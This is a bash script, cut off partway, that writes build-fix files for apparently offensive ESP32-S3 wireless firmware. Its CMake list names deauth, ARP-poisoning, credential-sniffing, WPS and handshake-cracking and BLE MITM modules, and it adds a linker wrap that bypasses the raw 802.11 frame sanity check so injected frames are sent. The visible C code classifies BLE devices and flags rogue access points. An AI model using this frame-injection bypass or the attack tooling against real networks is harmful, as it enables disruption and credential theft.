#!/usr/bin/env bash
# ============================================================================
#  REAPER (ESP32-S3-N16R8) — Complete Fix Script for ESP-IDF v6.1
#  Fixes:
#    1. All ESP-IDF v6.1 compilation & linker errors across 30 source/header files
#    2. Custom 16 MB partition table (partitions.csv) with 3 MB factory/OTA slots
#       and 5 MiB SPIFFS partition so reaper.bin fits with zero overflow
#    3. Configures target chip to esp32s3 (16 MB Flash + 8 MB Octal PSRAM)
#
#  Usage:
#    Run from the reaper root directory (or reaper/main):
#      bash apply_reaper_fixes.sh
# ============================================================================
set -euo pipefail

if [ -f "main.c" ] && [ -f "helper.h" ]; then
    TARGET_DIR="."
    PROJECT_ROOT=".."
elif [ -d "main" ] && [ -f "main/main.c" ]; then
    TARGET_DIR="main"
    PROJECT_ROOT="."
else
    echo "Error: Please run this script from either the 'reaper' root or 'reaper/main' directory." >&2
    exit 1
fi

echo "Applying ESP-IDF v6.1 fixes to '${TARGET_DIR}' (project root: '${PROJECT_ROOT}')..."

# Remove accidental all.txt concatenation artifact if present
if [ -f "${TARGET_DIR}/all.txt" ]; then
    rm -f "${TARGET_DIR}/all.txt"
    echo "  Removed accidental ${TARGET_DIR}/all.txt"
fi

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/CMakeLists.txt"
# ============================================================================
#  REAPER — main application component
#  Target: ESP32-S3-N16R8
# ============================================================================

set(reaper_srcs
    # ------------------------------------------------------------------
    # Core
    # ------------------------------------------------------------------
    main.c

    # ------------------------------------------------------------------
    # Platform
    # ------------------------------------------------------------------
    platform_antitamper.c
    platform_config.c
    platform_factory_test.c
    platform_fleet.c
    platform_plugins.c
    platform_secure_boot.c

    # ------------------------------------------------------------------
    # System health / logging / watchdog
    # ------------------------------------------------------------------
    health_ai_monitor.c
    health_telemetry.c
    structured_log.c
    watchdog.c

    # ------------------------------------------------------------------
    # Control / transport / RPC
    # ------------------------------------------------------------------
    cli_flipper.c
    cli_module.c
    cli_transport.c
    jsonrpc.c
    jsonrpc_schema.c
    ota_http.c
    port_detect.c
    usb_cdc.c

    # ------------------------------------------------------------------
    # Storage / export
    # ------------------------------------------------------------------
    export.c
    nvs_persist.c
    storage_sd.c
    storage_spiffs.c
    wordlist_manager.c

    # ------------------------------------------------------------------
    # Wi-Fi core
    # ------------------------------------------------------------------
    channel_hopper.c
    coex.c
    pcap_ring.c
    wifi_rrm.c
    wifi_sniffer.c

    # ------------------------------------------------------------------
    # Wi-Fi security / field modules
    # ------------------------------------------------------------------
    arp_poison.c
    attack_planner.c
    beacon_spam.c
    btm.c
    cred_sniffer.c
    deauth_engine.c
    dragonfly_sim.c
    eap_capture.c
    extra_offense.c
    ft_roam.c
    handshake_crack.c
    neighbor_report.c
    offensive.c
    pmkid.c
    reaction_rules.c
    sae_sidechannel.c
    scheduler.c
    stealth.c
    tx_bypass.c
    wardrive.c
    wps_pixiedust.c

    # ------------------------------------------------------------------
    # BLE
    # ------------------------------------------------------------------
    ble_ext_adv.c
    ble_findmy.c
    ble_gatt_client.c
    ble_gatt_enumerator.c
    ble_iso.c
    ble_mitm.c
    ble_periodic.c
    ble_phy.c
    ble_privacy.c
    ble_rpa_bypass.c
    ble_scanner.c
    ble_smarttag.c

    # ------------------------------------------------------------------
    # AI
    # ------------------------------------------------------------------
    ai_anomaly.c
    ai_ble_profiler.c
    ai_channel_predictor.c
    ai_classifier.c
    ai_deauth_predictor.c
    ai_fingerprint.c
    ai_handshake_quality.c
    ai_model.c
    ai_rogue_detector.c
    ai_training.c

    # ------------------------------------------------------------------
    # Misc radios / hardware / stubs
    # ------------------------------------------------------------------
    gps.c
    led_indicator.c
    matter_commissioner.c
    thread_border_router.c
    zigbee_sniffer.c
)

# ----------------------------------------------------------------------
# Stable requirements (present in IDF 5.x and 6.x)
#
# NOTE: esp_ota_ops is intentionally NOT listed.
#       The OTA API is provided by app_update.
# ----------------------------------------------------------------------
set(priv_reqs
    app_update
    bt
    console
    esp_event
    esp_http_client
    esp_http_server
    esp_https_ota
    esp_netif
    esp_system
    esp_timer
    esp_wifi
    fatfs
    freertos
    hal
    heap
    log
    lwip
    mbedtls
    nvs_flash
    sdmmc
    soc
    spi_flash
    vfs
)

# ----------------------------------------------------------------------
# Version-sensitive requirements
#
# IDF 5.3+ split `driver` into granular components, and some subsystems
# moved between releases. Resolve these by actual presence in the SDK
# rather than hard-coding a version-specific name.
# ----------------------------------------------------------------------
set(idf_optional_reqs
    driver
    json
    spiffs
    led_strip
    efuse
    bootloader_support
    esp_security
    esp_app_format
    esp_coex
    esp_partition
    esp_psram
    esp_hw_support
    esp_driver_gpio
    esp_driver_uart
    esp_driver_spi
    esp_driver_rmt
    esp_driver_tsens
    esp_driver_sdspi
    esp_driver_usb_serial_jtag
    esp_ota_ops
    usb
    tinyusb
)

foreach(req IN LISTS idf_optional_reqs)
    if(EXISTS "${IDF_PATH}/components/${req}")
        list(APPEND priv_reqs "${req}")
        message(STATUS "reaper: using IDF component '${req}'")
    endif()
endforeach()

# ----------------------------------------------------------------------
# led_strip is a managed component (espressif/led_strip).
# It is resolved via idf_component.yml and made available to this build.
# ----------------------------------------------------------------------

idf_component_register(
    SRCS ${reaper_srcs}
    INCLUDE_DIRS "."
    PRIV_REQUIRES ${priv_reqs}
)

# ----------------------------------------------------------------------
# Compiler warnings
# ----------------------------------------------------------------------
target_compile_options(${COMPONENT_LIB} PRIVATE
    -Os
    -Wall
    -Wextra
    -Wno-unused-parameter
    -Wno-error=format
    -Wno-error=format-truncation
    -Wno-error=stringop-truncation
    -Wno-error=deprecated-declarations
)

# ----------------------------------------------------------------------
# Raw 802.11 TX sanity-check override
#
# tx_bypass.c must define:
#   int __wrap_ieee80211_raw_frame_sanity_check(int32_t, int32_t, int32_t);
#
# Without this wrap, esp_wifi_80211_tx() silently drops injected frames.
# ----------------------------------------------------------------------
target_link_options(${COMPONENT_LIB} INTERFACE
    "-Wl,--wrap=ieee80211_raw_frame_sanity_check"
)
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/CMakeLists.txt"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_ble_profiler.c"
#include "ai_ble_profiler.h"
#include "ai_model.h"

#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <inttypes.h>

#include "esp_log.h"
#include "esp_system.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

static const char *TAG = "ai_ble";

typedef struct {
    uint8_t  ad_flags;
    uint16_t mfg_id;
    bool     has_name;
    bool     has_tx_power;
    int8_t   tx_power;
} ble_adv_features_t;

static char g_model_name[64] = {0};

static bool g_init_done = false;

static uint32_t g_total_count = 0;
static uint32_t g_model_count = 0;
static uint32_t g_heuristic_count = 0;

static uint32_t g_infer_every = AI_BLE_PROFILER_DEFAULT_INFER_EVERY;

static SemaphoreHandle_t g_lock = NULL;
static SemaphoreHandle_t g_infer_lock = NULL;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static const char *ble_class_name(ai_ble_class_t cls)
{
    switch (cls) {
        case AI_BLE_TAG:     return "tag";
        case AI_BLE_PHONE:   return "phone";
        case AI_BLE_SENSOR:  return "sensor";
        case AI_BLE_TRACKER: return "tracker";
        case AI_BLE_BEACON:  return "beacon";
        default:             return "unknown";
    }
}

const char *ai_ble_profiler_class_name(ai_ble_class_t cls)
{
    return ble_class_name(cls);
}

static void sanitize_model_name(char *dst, size_t dst_sz, const char *src)
{
    if (dst == NULL || dst_sz == 0) {
        return;
    }

    size_t j = 0;

    if (src != NULL) {
        for (size_t i = 0; src[i] != '\0' && j + 1 < dst_sz; i++) {
            unsigned char c = (unsigned char)src[i];

            if (isprint(c) && c != '"' && c != '\\') {
                dst[j++] = (char)c;
            } else {
                dst[j++] = '_';
            }
        }
    }

    dst[j] = '\0';
}

/* -------------------------------------------------------------------------
 *  Advertisement parsing
 * ----------------------------------------------------------------------- */

static void parse_adv_fields(const uint8_t *data, size_t len, ble_adv_features_t *feat)
{
    memset(feat, 0, sizeof(*feat));

    if (data == NULL || len == 0) {
        return;
    }

    size_t pos = 0;

    while (pos + 1 < len) {
        uint8_t ad_len = data[pos];

        if (ad_len == 0) {
            break;
        }

        if (pos + 1 + ad_len > len) {
            break;
        }

        uint8_t ad_type = data[pos + 1];
        const uint8_t *val = data + pos + 2;
        size_t val_len = ad_len - 1;

        switch (ad_type) {
            case 0x01: /* Flags */
                if (val_len >= 1) {
                    feat->ad_flags = val[0];
                }
                break;

            case 0x08: /* Shortened Local Name */
            case 0x09: /* Complete Local Name */
                if (val_len > 0) {
                    feat->has_name = true;
                }
                break;

            case 0x0A: /* TX Power Level */
                if (val_len >= 1) {
                    feat->has_tx_power = true;
                    feat->tx_power = (int8_t)val[0];
                }
                break;

            case 0xFF: /* Manufacturer Specific Data */
                if (val_len >= 2) {
                    feat->mfg_id = (uint16_t)(val[0] | ((uint16_t)val[1] << 8));
                }
                break;

            default:
                break;
        }

        pos += 1 + ad_len;
    }
}

static int32_t get_tx_dbm(const ble_info_t *info, const ble_adv_features_t *feat)
{
    if (feat->has_tx_power) {
        return (int32_t)feat->tx_power;
    }

    /*
     * Scanner uses 0x7F as "unknown".
     * Also treat 0 as unknown because many parsers initialize to zero.
     */
    if (info->tx_power == 0 || info->tx_power == 0x7F) {
        return 0;
    }

    /*
     * If tx_power is stored as a raw signed byte, reinterpret it.
     */
    return (int32_t)(int8_t)info->tx_power;
}

static uint8_t normalize_tx_feature(int32_t tx_dbm)
{
    /*
     * Normalize roughly -100..+20 dBm into 0..255.
     */
    if (tx_dbm < -100) {
        tx_dbm = -100;
    }

    if (tx_dbm > 20) {
        tx_dbm = 20;
    }

    int32_t normalized = ((tx_dbm + 100) * 255) / 120;

    if (normalized < 0) {
        normalized = 0;
    }

    if (normalized > 255) {
        normalized = 255;
    }

    return (uint8_t)normalized;
}

/* -------------------------------------------------------------------------
 *  Feature tensor
 * ----------------------------------------------------------------------- */

static void build_ble_tensor(const ble_info_t *info,
                             const ble_adv_features_t *feat,
                             uint8_t tensor[AI_BLE_PROFILER_FEAT_SZ])
{
    memset(tensor, 0, AI_BLE_PROFILER_FEAT_SZ);

    /*
     * Layout:
     *
     * [0] MAC/OUI byte 0
     * [1] MAC/OUI byte 1
     * [2] MAC/OUI byte 2
     * [3] behavior flags
     * [4] normalized TX power
     * [5] adv_mode
     * [6] AD flags
     * [7] manufacturer ID low byte
     */

    tensor[0] = info->mac[0];
    tensor[1] = info->mac[1];
    tensor[2] = info->mac[2];

    uint8_t flags = 0;

    if (info->has_scan_rsp) {
        flags |= 0x01;
    }

    if (info->adv_mode == 1) {
        flags |= 0x02;
    }

    if (info->phy_coded_s8) {
        flags |= 0x04;
    }

    if (info->periodic_adv_seen) {
        flags |= 0x08;
    }

    if (info->rpa_seen) {
        flags |= 0x10;
    }

    if (info->ext_adv_seen) {
        flags |= 0x20;
    }

    if (feat->has_name) {
        flags |= 0x40;
    }

    if (feat->has_tx_power) {
        flags |= 0x80;
    }

    tensor[3] = flags;

    int32_t tx_dbm = get_tx_dbm(info, feat);
    tensor[4] = normalize_tx_feature(tx_dbm);

    tensor[5] = info->adv_mode;
    tensor[6] = feat->ad_flags;
    tensor[7] = (uint8_t)(feat->mfg_id & 0xFFu);
}

/* -------------------------------------------------------------------------
 *  Heuristic fallback
 * ----------------------------------------------------------------------- */

static ai_ble_class_t heuristic_classify(const ble_info_t *info,
                                         const ble_adv_features_t *feat)
{
    int32_t tx_dbm = get_tx_dbm(info, feat);

    /*
     * Periodic non-connectable advertisers are often beacons.
     */
    if (info->periodic_adv_seen && info->adv_mode == 1) {
        return AI_BLE_BEACON;
    }

    /*
     * Apple/Samsung manufacturer data + random MAC + no name is suspicious.
     */
    if ((feat->mfg_id == 0x004C || feat->mfg_id == 0x0075) &&
        info->addr_type != 0 &&
        !feat->has_name) {

        if (info->rpa_seen || info->phy_coded_s8) {
            return AI_BLE_TRACKER;
        }

        return AI_BLE_TAG;
    }

    /*
     * Original behavior preserved as much as possible.
     */
    if (info->has_scan_rsp && info->adv_mode == 1) {
        return AI_BLE_TRACKER;
    }

    if (info->phy_coded_s8 && tx_dbm < -50) {
        return AI_BLE_SENSOR;
    }

    if (info->adv_mode == 1 && !info->has_scan_rsp) {
        return AI_BLE_TAG;
    }

    if (info->rpa_seen && info->has_scan_rsp) {
        return AI_BLE_PHONE;
    }

    return AI_BLE_UNKNOWN;
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t ai_ble_profiler_init(void)
{
    if (g_init_done) {
        return ESP_OK;
    }

    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    if (g_infer_lock == NULL) {
        g_infer_lock = xSemaphoreCreateMutex();
        if (g_infer_lock == NULL) {
            vSemaphoreDelete(g_lock);
            g_lock = NULL;
            return ESP_ERR_NO_MEM;
        }
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    memset(g_model_name, 0, sizeof(g_model_name));

    g_init_done = true;
    g_total_count = 0;
    g_model_count = 0;
    g_heuristic_count = 0;
    g_infer_every = AI_BLE_PROFILER_DEFAULT_INFER_EVERY;

    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "BLE profiler initialized");
    return ESP_OK;
}

void ai_ble_profiler_deinit(void)
{
    if (g_lock == NULL) {
        return;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    memset(g_model_name, 0, sizeof(g_model_name));

    g_init_done = false;
    g_total_count = 0;
    g_model_count = 0;
    g_heuristic_count = 0;
    g_infer_every = AI_BLE_PROFILER_DEFAULT_INFER_EVERY;

    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "BLE profiler deinitialized");
}

/* -------------------------------------------------------------------------
 *  Configuration
 * ----------------------------------------------------------------------- */

esp_err_t ai_ble_profiler_set_model(const char *model_name)
{
    if (model_name == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    sanitize_model_name(g_model_name, sizeof(g_model_name), model_name);
    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "BLE profiler model set: '%s'", g_model_name);
    return ESP_OK;
}

esp_err_t ai_ble_profiler_set_infer_every(uint32_t every_n)
{
    if (every_n == 0) {
        every_n = 1;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);
    g_infer_every = every_n;
    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "BLE profiler model inference every %" PRIu32 " advertisements", every_n);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Classification
 * ----------------------------------------------------------------------- */

esp_err_t ai_ble_profiler_classify(const ble_info_t *info,
                                   const uint8_t *adv_data,
                                   size_t adv_len,
                                   ai_ble_profile_t *out)
{
    if (info == NULL || out == NULL) {
        return ESP_ERR_INVALID_ARG;
    }

    if (adv_data == NULL && adv_len > 0) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    memset(out, 0, sizeof(*out));
    memcpy(out->oui, info->mac, 3);

    ble_adv_features_t feat;
    parse_adv_fields(adv_data, adv_len, &feat);

    uint8_t tensor[AI_BLE_PROFILER_FEAT_SZ];
    build_ble_tensor(info, &feat, tensor);

    char model_local[sizeof(g_model_name)] = {0};
    bool should_infer = false;

    xSemaphoreTake(g_lock, portMAX_DELAY);

    g_total_count++;

    bool model_enabled = (g_model_name[0] != '\0');

    if (model_enabled) {
        if (g_infer_every <= 1 || (g_total_count % g_infer_every) == 0) {
            snprintf(model_local, sizeof(model_local), "%s", g_model_name);
            should_infer = true;
        }
    }

    xSemaphoreGive(g_lock);

    /*
     * Try model inference outside the state lock.
     */
    if (should_infer) {
        uint8_t model_out[4] = {0};
        size_t out_len = 0;

        uint64_t t0 = esp_timer_get_time();

        if (g_infer_lock != NULL) {
            xSemaphoreTake(g_infer_lock, portMAX_DELAY);
        }

        esp_err_t rc = ai_model_zoo_infer(
            model_local,
            tensor,
            sizeof(tensor),
            model_out,
            sizeof(model_out),
            &out_len
        );

        if (g_infer_lock != NULL) {
            xSemaphoreGive(g_infer_lock);
        }

        uint64_t dt = esp_timer_get_time() - t0;

        if (rc == ESP_OK && out_len >= 4) {
            uint8_t cls_byte = model_out[0];

            if (cls_byte <= AI_BLE_BEACON) {
                out->cls = (ai_ble_class_t)cls_byte;
            } else {
                out->cls = AI_BLE_UNKNOWN;
            }

            snprintf(out->label, sizeof(out->label), "%s", ble_class_name(out->cls));

            out->adv_type = info->adv_mode;
            out->flags = model_out[1];
            out->model_loaded = true;
            out->inference_us = (uint32_t)dt;

            xSemaphoreTake(g_lock, portMAX_DELAY);
            g_model_count++;
            xSemaphoreGive(g_lock);

            return ESP_OK;
        }

        ESP_LOGD(TAG, "Model inference failed; falling back to heuristic");
    }

    /*
     * Heuristic fallback.
     */
    ai_ble_class_t cls = heuristic_classify(info, &feat);

    out->cls = cls;
    snprintf(out->label, sizeof(out->label), "%s", ble_class_name(cls));
    out->adv_type = info->adv_mode;
    out->flags = feat.ad_flags;
    out->model_loaded = false;
    out->inference_us = 0;

    xSemaphoreTake(g_lock, portMAX_DELAY);
    g_heuristic_count++;
    xSemaphoreGive(g_lock);

    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Stats / JSON
 * ----------------------------------------------------------------------- */

esp_err_t ai_ble_profiler_json(char *buf, size_t bufsz)
{
    if (buf == NULL || bufsz == 0) {
        return ESP_ERR_INVALID_ARG;
    }

    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    uint32_t total;
    uint32_t model;
    uint32_t heuristic;
    char model_name[sizeof(g_model_name)];

    xSemaphoreTake(g_lock, portMAX_DELAY);

    total = g_total_count;
    model = g_model_count;
    heuristic = g_heuristic_count;
    snprintf(model_name, sizeof(model_name), "%s", g_model_name);

    xSemaphoreGive(g_lock);

    int w = snprintf(
        buf,
        bufsz,
        "{\"total\":%" PRIu32
        ",\"model\":%" PRIu32
        ",\"heuristic\":%" PRIu32
        ",\"model_name\":\"%s\"}",
        total,
        model,
        heuristic,
        model_name
    );

    if (w < 0 || (size_t)w >= bufsz) {
        return ESP_ERR_INVALID_SIZE;
    }

    return ESP_OK;
}
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_ble_profiler.c"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_channel_predictor.h"
#ifndef AI_CHANNEL_PREDICTOR_H
#define AI_CHANNEL_PREDICTOR_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* History window size: number of past occupancy snapshots to keep. */
#define AI_CH_PREDICTOR_HISTORY                   8

/* Default minimum time between automatic snapshot records. */
#define AI_CH_PREDICTOR_DEFAULT_RECORD_INTERVAL_MS 250

/* Predicted result. */
typedef struct {
    uint8_t  best_channel;     /* predicted best channel (1..13) */
    float    confidence;       /* confidence 0..1 */
    uint32_t history_count;    /* snapshots collected so far */
    uint32_t infer_count;      /* successful model inferences */
    uint32_t fallback_count;   /* heuristic fallback uses */
    bool     model_loaded;     /* true if last prediction used model */
    uint32_t inference_us;     /* last model inference time */
} ai_channel_predict_t;

/**
 * @brief Initialize channel predictor.
 */
esp_err_t ai_channel_predictor_init(void);

/**
 * @brief Deinit predictor.
 */
void ai_channel_predictor_deinit(void);

/**
 * @brief Set model name for LSTM predictor.
 */
esp_err_t ai_channel_predictor_set_model(const char *model_name);

/**
 * @brief Set minimum interval between record snapshots.
 *
 * interval_ms = 0 allows every call, but this is not recommended
 * when called from packet-processing paths.
 */
esp_err_t ai_channel_predictor_set_record_interval_ms(uint32_t interval_ms);

/**
 * @brief Record current channel occupancy snapshot.
 *
 * This is internally throttled by the record interval.
 */
esp_err_t ai_channel_predictor_record(void);

/**
 * @brief Predict best next channel for scanning/attack planning.
 *
 * Uses LSTM model if loaded; otherwise picks channel with highest
 * recent packet delta from history.
 */
esp_err_t ai_channel_predictor_predict(ai_channel_predict_t *out);

/**
 * @brief Return predictor stats as JSON.
 */
esp_err_t ai_channel_predictor_json(char *buf, size_t bufsz);

#ifdef __cplusplus
}
#endif

#endif /* AI_CHANNEL_PREDICTOR_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_channel_predictor.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_handshake_quality.h"
#ifndef AI_HANDSHAKE_QUALITY_H
#define AI_HANDSHAKE_QUALITY_H

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>

#include "esp_err.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Quality factor bits. */
#define AI_HS_FACTOR_COMPLETE     (1u << 0)
#define AI_HS_FACTOR_NONCES       (1u << 1)
#define AI_HS_FACTOR_MIC          (1u << 2)
#define AI_HS_FACTOR_PMKID        (1u << 3)
#define AI_HS_FACTOR_EAPOL        (1u << 4)
#define AI_HS_FACTOR_STRONG_RSSI  (1u << 5)

/* Handshake quality result. */
typedef struct {
    float    score;         /* 0..1: higher = more likely to crack */
    uint32_t factors;       /* bitmask of quality factors */
    uint32_t m1_count;      /* inferred M1 presence/count */
    uint32_t m2_count;      /* inferred M2 presence/count */
    int8_t   rssi;          /* RSSI of AP if known */
    uint16_t eapol_len;     /* captured EAPOL length */
    bool     has_anonce;
    bool     has_snonce;
    bool     has_mic;
    bool     has_pmkid;
    bool     complete;      /* valid capture present */
    bool     model_loaded;
    uint32_t inference_us;
} ai_hs_quality_t;

/**
 * @brief Initialize handshake quality scorer.
 */
esp_err_t ai_hs_quality_init(void);

/**
 * @brief Deinit scorer.
 */
void ai_hs_quality_deinit(void);

/**
 * @brief Set model name for crackability predictor.
 */
esp_err_t ai_hs_quality_set_model(const char *model_name);

/**
 * @brief Score current captured handshake.
 */
esp_err_t ai_hs_quality_score(ai_hs_quality_t *out);

/**
 * @brief Return quality stats as JSON.
 */
esp_err_t ai_hs_quality_json(char *buf, size_t bufsz);

#ifdef __cplusplus
}
#endif

#endif /* AI_HANDSHAKE_QUALITY_H */
EOF_REAPER_FILE
echo "  Updated ${TARGET_DIR}/ai_handshake_quality.h"

cat << 'EOF_REAPER_FILE' > "${TARGET_DIR}/ai_rogue_detector.c"
#include "ai_rogue_detector.h"
#include "common_types.h"
#include "wifi_sniffer.h"

#include <string.h>
#include <stdio.h>
#include <ctype.h>
#include <stdarg.h>
#include <inttypes.h>

#include "esp_log.h"
#include "esp_system.h"
#include "esp_err.h"
#include "esp_timer.h"

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

static const char *TAG = "ai_rogue";

#define AI_ROGUE_SCAN_INTERVAL_US 1000000LL /* 1 second */

typedef enum {
    ROGUE_SEC_OPEN = 0,
    ROGUE_SEC_PROTECTED = 1,
    ROGUE_SEC_WPA3 = 2
} rogue_sec_profile_t;

typedef struct {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t oui[3];
    uint8_t channel;
    rogue_sec_profile_t sec;
} rogue_ap_entry_t;

static ai_rogue_alert_t g_alerts[AI_ROGUE_MAX_ALERTS];
static uint8_t g_alert_count = 0;

static rogue_ap_entry_t g_entries[MAX_DISCOVERED_APS];

static bool g_init_done = false;
static int64_t g_last_scan_us = 0;

static SemaphoreHandle_t g_lock = NULL;

/* -------------------------------------------------------------------------
 *  Helpers
 * ----------------------------------------------------------------------- */

static bool mac_is_locally_administered(const uint8_t *mac)
{
    if (mac == NULL) {
        return false;
    }

    return (mac[0] & 0x02u) != 0;
}

static rogue_sec_profile_t get_security_profile(const ap_info_t *ap)
{
    if (ap->wpa3_sae) {
        return ROGUE_SEC_WPA3;
    }

    if (ap->pmf_capable || ap->rsn_version != 0 || ap->akm_count != 0) {
        return ROGUE_SEC_PROTECTED;
    }

    return ROGUE_SEC_OPEN;
}

static void reason_append(char *reason, size_t reason_sz, const char *text)
{
    if (reason == NULL || reason_sz == 0 || text == NULL) {
        return;
    }

    size_t len = strlen(reason);

    if (len > 0) {
        snprintf(reason + len, reason_sz - len, "; %s", text);
    } else {
        snprintf(reason, reason_sz, "%s", text);
    }
}

static void escape_json_string(char *dst, size_t dst_sz, const char *src)
{
    if (dst == NULL || dst_sz == 0) {
        return;
    }

    size_t j = 0;

    if (src == NULL) {
        dst[0] = '\0';
        return;
    }

    for (size_t i = 0; src[i] != '\0' && j + 1 < dst_sz; i++) {
        unsigned char c = (unsigned char)src[i];

        if (c == '"' || c == '\\') {
            if (j + 2 >= dst_sz) {
                break;
            }

            dst[j++] = '\\';
            dst[j++] = (char)c;
        } else if (isprint(c)) {
            dst[j++] = (char)c;
        } else {
            dst[j++] = '_';
        }
    }

    dst[j] = '\0';
}

static void add_alert_locked(const rogue_ap_entry_t *entry,
                             uint8_t flags,
                             uint8_t peer_count,
                             const char *reason)
{
    if (g_alert_count >= AI_ROGUE_MAX_ALERTS) {
        return;
    }

    ai_rogue_alert_t *a = &g_alerts[g_alert_count];

    memset(a, 0, sizeof(*a));

    snprintf(a->ssid, sizeof(a->ssid), "%s", entry->ssid);
    memcpy(a->bssid, entry->bssid, 6);
    memcpy(a->oui, entry->oui, 3);

    a->channel = entry->channel;
    a->flags = flags;
    a->peer_count = peer_count;

    snprintf(a->reason, sizeof(a->reason), "%s", reason != NULL ? reason : "");

    g_alert_count++;
}

/* -------------------------------------------------------------------------
 *  Lifecycle
 * ----------------------------------------------------------------------- */

esp_err_t ai_rogue_detector_init(void)
{
    if (g_init_done) {
        return ESP_OK;
    }

    if (g_lock == NULL) {
        g_lock = xSemaphoreCreateMutex();
        if (g_lock == NULL) {
            return ESP_ERR_NO_MEM;
        }
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    memset(g_alerts, 0, sizeof(g_alerts));
    memset(g_entries, 0, sizeof(g_entries));

    g_alert_count = 0;
    g_last_scan_us = 0;
    g_init_done = true;

    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "Rogue AP detector initialized");
    return ESP_OK;
}

void ai_rogue_detector_deinit(void)
{
    if (g_lock == NULL) {
        return;
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    memset(g_alerts, 0, sizeof(g_alerts));
    memset(g_entries, 0, sizeof(g_entries));

    g_alert_count = 0;
    g_last_scan_us = 0;
    g_init_done = false;

    xSemaphoreGive(g_lock);

    ESP_LOGI(TAG, "Rogue AP detector deinitialized");
}

/* -------------------------------------------------------------------------
 *  Scan
 * ----------------------------------------------------------------------- */

esp_err_t ai_rogue_detector_scan(void)
{
    if (g_lock == NULL || !g_init_done) {
        return ESP_ERR_INVALID_STATE;
    }

    int64_t now = esp_timer_get_time();

    xSemaphoreTake(g_lock, portMAX_DELAY);

    if ((now - g_last_scan_us) < AI_ROGUE_SCAN_INTERVAL_US) {
        xSemaphoreGive(g_lock);
        return ESP_OK;
    }

    g_last_scan_us = now;

    g_alert_count = 0;
    memset(g_alerts, 0, sizeof(g_alerts));
    memset(g_entries, 0, sizeof(g_entries));

    xSemaphoreGive(g_lock);

    uint16_t ap_count = wifi_sniffer_get_ap_count();

    if (ap_count > MAX_DISCOVERED_APS) {
        ap_count = MAX_DISCOVERED_APS;
    }

    uint16_t entry_count = 0;

    for (uint16_t i = 0; i < ap_count; i++) {
        ap_info_t ap;

        if (wifi_sniffer_get_ap(i, &ap) != ESP_OK) {
            continue;
        }

        if (ap.ssid[0] == '\0') {
            continue;
        }

        if (strcmp(ap.ssid, "<HIDDEN>") == 0) {
            continue;
        }

        xSemaphoreTake(g_lock, portMAX_DELAY);

        rogue_ap_entry_t *e = &g_entries[entry_count];

        snprintf(e->ssid, sizeof(e->ssid), "%s", ap.ssid);
        memcpy(e->bssid, ap.bssid, 6);
        memcpy(e->oui, ap.bssid, 3);
        e->channel = ap.channel;
        e->sec = get_security_profile(&ap);

        entry_count++;

        xSemaphoreGive(g_lock);

        if (entry_count >= MAX_DISCOVERED_APS) {
            break;
        }
    }

    xSemaphoreTake(g_lock, portMAX_DELAY);

    for (uint16_t i = 0; i < entry_count; i++) {
        const rogue_ap_entry_t *a = &g_entries[i];

        uint8_t flags = 0;
        uint8_t peer_count = 0;
        char reason[64] = "";

        for (uint16_t j = 0; j < entry_count; j++) {
            if (i == j) {
                continue;
            }

            const rogue_ap_entry_t *b = &g_entries[j];

            if (strcmp(a->ssid, b->ssid) != 0) {
                continue;
            }

            peer_count++;

            if (memcmp(a->oui, b->oui, 3) != 0) {
                flags |= AI_ROGUE_FLAG_DIFF_OUI;
                reason_append(reason, sizeof(reason), "diff OUI");
            }

            if (a->channel != b->channel) {
                flags |= AI_ROGUE_FLAG_DIFF_CHAN;
                reason_append(reason, sizeof(reason), "diff channel");
            }

            if (a->sec != b->sec) {
                flags |= AI_ROGUE_FLAG_DIFF_CIPHER;
                reason_append(reason, sizeof(reason), "mixed security");
            }
        }

        if (peer_count > 0 && mac_is_locally_administered(a->bssid)) {
            flags |= AI_ROGUE_FLAG_MAC_ANOMALY;
            reason_append(reason, sizeof(reason), "local MAC");
        }

        if (flags != 0) {
            add_alert_locked(a, flags, peer_count, reason);
        }
    }

    uint8_t final_count = g_alert_count;

    xSemaphoreGive(g_lock);

    (void)final_count;
    ESP_LOGI(TAG, "Rogue scan complete: %u alerts", final_count);
    return ESP_OK;
}

/* -------------------------------------------------------------------------
 *  Alert access
 * ----------------------------------------------------------------------- */

uint8_t ai_rogue_detector_alert_count(void)
